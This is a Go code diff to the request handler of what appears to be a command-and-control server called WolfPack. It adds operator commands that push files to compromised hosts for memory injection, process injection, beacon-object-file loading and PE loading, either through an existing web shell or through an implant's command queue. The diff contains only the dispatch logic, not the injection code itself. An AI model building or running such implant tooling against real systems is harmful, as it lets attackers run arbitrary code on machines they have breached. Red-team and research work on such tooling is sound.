@@ -515,6 +515,166 @@ func handleWolfPackRequests(w http.ResponseWriter, r *http.Request) {
 					}
 				}
 
+			} else if getCommand[0] == "mem_inject" {
+
+				if getFile != "" {
+					sessionVal, ok := core.Sessions.Load(getActiveSession)
+					if !ok {
+						core.LogData("Session does not exist")
+						return
+					}
+					session := sessionVal.(core.Session)
+
+					if session.CommandQuery != "" {
+						var cmdString = "mem_inject"
+
+						core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": " + cmdString)
+
+						_, err := core.ExecuteConnection(session.Rhost, session.Rport, session.Protocol, session.ShellPath, session.CommandQuery, cmdString, session.Query, session.RequestType, getFileName, getFile)
+						if err != nil {
+							errorString := "an error occurred executing the connection, is the shell still up?"
+							core.LogData(errorString)
+							returnErr := errors.New(errorString)
+							ErrorHandler(returnErr)
+						}
+
+					} else {
+						var cmdString = "mem_inject " + getFileName + " " + getFile
+
+						core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": mem_inject")
+
+						core.QueueImplantCommand(getActiveSession, cmdString, CurrentOperator)
+					}
+				}
+
+			} else if getCommand[0] == "pid_inject" {
+
+				if getFile != "" {
+					sessionVal, ok := core.Sessions.Load(getActiveSession)
+					if !ok {
+						core.LogData("Session does not exist")
+						return
+					}
+					session := sessionVal.(core.Session)
+
+					if session.CommandQuery != "" {
+						var cmdString = "pid_inject"
+
+						core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": " + cmdString)
+
+						_, err := core.ExecuteConnection(session.Rhost, session.Rport, session.Protocol, session.ShellPath, session.CommandQuery, cmdString, session.Query, session.RequestType, getFileName, getFile)
+						if err != nil {
+							errorString := "an error occurred executing the connection, is the shell still up?"
+							core.LogData(errorString)
+							returnErr := errors.New(errorString)
+							ErrorHandler(returnErr)
+						}
+
+					} else {
+						var cmdString = "pid_inject " + getFileName + " " + getFile
+
+						core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": pid_inject")
+
+						core.QueueImplantCommand(getActiveSession, cmdString, CurrentOperator)
+					}
+				}
+
+			} else if getCommand[0] == "bof_loader" {
+
+				if getFile != "" {
+					sessionVal, ok := core.Sessions.Load(getActiveSession)
+					if !ok {
+						core.LogData("Session does not exist")
+						return
+					}
+					session := sessionVal.(core.Session)
+
+					if session.CommandQuery != "" {
+						var cmdString = "bof_loader"
+
+						core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": " + cmdString)
+
+						_, err := core.ExecuteConnection(session.Rhost, session.Rport, session.Protocol, session.ShellPath, session.CommandQuery, cmdString, session.Query, session.RequestType, getFileName, getFile)
+						if err != nil {
+							errorString := "an error occurred executing the connection, is the shell still up?"
+							core.LogData(errorString)
+							returnErr := errors.New(errorString)
+							ErrorHandler(returnErr)
+						}
+
+					} else {
+						var cmdString = "bof_loader " + getFileName + " " + getFile
+
+						core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": bof_loader")
+
+						core.QueueImplantCommand(getActiveSession, cmdString, CurrentOperator)
+					}
+				}
+
+			} else if getCommand[0] == "bof_loader_async" {
+
+				if getFile != "" {
+					sessionVal, ok := core.Sessions.Load(getActiveSession)
+					if !ok {
+						core.LogData("Session does not exist")
+						return
+					}
+					session := sessionVal.(core.Session)
+
+					if session.CommandQuery != "" {
+						var cmdString = "bof_loader_async"
+
+						core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": " + cmdString)
+
+						_, err := core.ExecuteConnection(session.Rhost, session.Rport, session.Protocol, session.ShellPath, session.CommandQuery, cmdString, session.Query, session.RequestType, getFileName, getFile)
+						if err != nil {
+							errorString := "an error occurred executing the connection, is the shell still up?"
+							core.LogData(errorString)
+							returnErr := errors.New(errorString)
+							ErrorHandler(returnErr)
+						}
+
+					} else {
+						var cmdString = "bof_loader_async " + getFileName + " " + getFile
+
+						core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": bof_loader_async")
+
+						core.QueueImplantCommand(getActiveSession, cmdString, CurrentOperator)
+					}
+				}
+
+			} else if getCommand[0] == "pe_loader" {
+
+				if getFile != "" {
+					sessionVal, ok := core.Sessions.Load(getActiveSession)
+					if !ok {
+						core.LogData("Session does not exist")
+						return
+					}
+					session := sessionVal.(core.Session)
+
+					if session.CommandQuery != "" {
+						var cmdString = "pe_loader"
+
+						core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": " + cmdString)
+
+						_, err := core.ExecuteConnection(session.Rhost, session.Rport, session.Protocol, session.ShellPath, session.CommandQuery, cmdString, session.Query, session.RequestType, getFileName, getFile)
+						if err != nil {
+							errorString := "an error occurred executing the connection, is the shell still up?"
+							core.LogData(errorString)
+							returnErr := errors.New(errorString)
+							ErrorHandler(returnErr)
+						}
+
+					} else {
+						var cmdString = "pe_loader " + getFileName + " " + getFile
+
+						core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": pe_loader")
+
+						core.QueueImplantCommand(getActiveSession, cmdString, CurrentOperator)
+					}
+				}
+
 			}
 		} else {
 			WolfPackApp.RunCommand(getCommand)
